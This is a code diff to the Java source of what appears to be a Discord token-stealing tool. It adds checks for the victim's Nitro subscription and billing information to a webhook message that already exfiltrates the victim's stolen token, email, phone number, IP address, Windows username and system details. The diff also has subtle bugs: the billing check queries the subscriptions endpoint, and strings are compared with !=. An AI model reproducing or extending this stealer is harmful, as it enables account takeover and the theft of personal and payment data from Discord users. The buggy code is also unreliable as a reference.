@@ -73,7 +73,7 @@ public class Main {
         String accountInfo_email;
         String accountInfo_phoneNr;
         boolean accountInfo_hasNitro; //https://discord.com/api/v8/users/@me/billing/subscriptions
-        String accountInfo_billingInfo; //https://discord.com/api/v8/users/@me/billing/payment-sources
+        boolean accountInfo_hasBillingInfo; //https://discord.com/api/v8/users/@me/billing/payment-sources
         String accountInfo_imageURL;
 
         //PC Info
@@ -93,6 +93,8 @@ public class Main {
         //Get discord token
         String tokenInformation = get_request("https://discordapp.com/api/v6/users/@me", true, token).replace(",", ",\n");
         accountInfo_username = getJsonKey(tokenInformation, "username") + "#" + getJsonKey(tokenInformation, "discriminator");
+        accountInfo_hasNitro = get_request("https://discord.com/api/v8/users/@me/billing/subscriptions", true, token) != "[]";
+        accountInfo_hasBillingInfo = get_request("https://discord.com/api/v8/users/@me/billing/subscriptions", true, token) != "[]";
         accountInfo_email = getJsonKey(tokenInformation, "email");
 
         accountInfo_phoneNr = getJsonKey(tokenInformation, "phone");
@@ -101,7 +103,7 @@ public class Main {
 
 
         String finishedEmbedContent = "{\"avatar_url\":\""+avatar_url+"\",\"embeds\":[{\"thumbnail\":{\"url\":\""+accountInfo_imageURL+"\"},\"color\":9109759,\"footer\":{\"icon_url\":\"https://i.ibb.co/fps45hd/steampfp.jpg\",\"text\":\"November | "+new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS").format(System.currentTimeMillis())+"\"},\"author\":{\"name\":\""+accountInfo_username+"\"},\"fields\":[{\"inline\":true,\"name\":\"Account Info\",\"value\":\"Email: "+accountInfo_email+"\\nPhone: "+accountInfo_phoneNr+"\\nNitro: Coming Soon\\nBilling Info: Coming Soon\"},{\"inline\":true,\"name\":\"PC Info\",\"value\":\"IP: "+pcInfo_IP+"\\nUsername: "+pcInfo_Username+"\\nWindows version: "+pcInfo_WindowsVersion+"\\nCPU Arch: "+pcInfo_cpuArch+"\"},{\"name\":\"**Token**\",\"value\":\"```"+token+"```\"}]}],\"username\":\""+username+"\"}";
-        String finishedTextContent = "{\"avatar_url\":\""+accountInfo_imageURL+"\",\"content\":\"***Discord Info***\\n**Email:**\\n```"+accountInfo_email+"```\\n**Phone NR:**\\n```"+accountInfo_phoneNr+"```\\n**Nitro:**\\n```Coming soon...```\\n**Billing Info:**\\n```Coming soon...```\\n**Token**\\n```"+token+"```\\n\\n***PC Info**\\n**Username: ***\\n```"+accountInfo_username+"```\\n**IP:**\\n```"+pcInfo_IP+"```\\n**Windows version:**\\n```"+pcInfo_WindowsVersion+"```\\n**CPU Arch:**\\n```"+pcInfo_cpuArch+"```\",\"username\":\""+accountInfo_username+"\"}";
+        String finishedTextContent = "{\"avatar_url\":\""+accountInfo_imageURL+"\",\"content\":\"***Discord Info***\\n**Email:**\\n```"+accountInfo_email+"```\\n**Phone NR:**\\n```"+accountInfo_phoneNr+"```\\n**Nitro:**\\n```"+accountInfo_hasNitro+"```\\n**Billing Info:**\\n```"+accountInfo_hasBillingInfo+"```\\n**Token**\\n```"+token+"```\\n\\n***PC Info**\\n**Username: ***\\n```"+accountInfo_username+"```\\n**IP:**\\n```"+pcInfo_IP+"```\\n**Windows version:**\\n```"+pcInfo_WindowsVersion+"```\\n**CPU Arch:**\\n```"+pcInfo_cpuArch+"```\",\"username\":\""+accountInfo_username+"\"}";
 
         if (sendEmbed) {
             if (debug) {
